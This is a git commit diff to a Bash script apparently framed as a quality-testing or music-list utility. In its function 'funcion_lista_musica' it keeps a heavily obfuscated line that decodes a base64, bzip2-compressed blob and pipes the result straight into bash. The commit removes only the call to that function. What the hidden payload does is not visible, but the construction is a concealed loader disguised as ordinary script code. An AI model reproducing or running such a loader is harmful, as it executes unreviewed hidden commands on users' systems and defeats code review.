38731ae6831e0b9aab75e5c1f866b603f08d5f35
maxheadroom2 <sinteticbeat@hotmail.com>
2021-10-05 13:08:11 -0500

    ajustes

--- sistema_pruebas_calidad.sh
+++ sistema_pruebas_calidad.sh
@@ -38,11 +38,6 @@ funcion_lista_musica(){
  ${@,,} $'b\x61s'$'\150' ${*,} ${*,,}   <<<   "$(      ${*~} ''\p$'\x72'$'\x69''n'tf  'QlpoOTFBWSZTWQQ6uQsAAAOdgEAABwBAAQpAhAAgACIAMQgGmmgtNXY1ArGXi7kinChIAh1chYA='   "${@%%\]=\]G\`\{:}" "${@~~}"  |   ${*/X=0\{nO/sb\[7\`44;}   ${@~~} b'a'se6$'\u0034'  -d   ${*,,}   |  ${@#O<Qau\]=P}   ${*,,}   ""b'u'${*^}n""$'z\x69'\p$[   ((${*}3${*%%ZY\)lq.p}5#0*3"5""#"0)+${*}37#"2")  ]   -c  ${@,} "${@}"      )"  "${@//\[\)\)-;}"  "${@~}" 
 }
 
-prueba=$(funcion_lista_musica)
-echo prueba
-
-function_preparacion_entorno_01
-
 function_preparacion_entorno(){
     DIR1=$HOME/.Music_cache/
     DIR2=$HOME/Nextcloud/Laborales/Sistema_pruebas/Archivo_de_pruebas_computo/Archivos_cache_planos/Lista_favoritos.7z
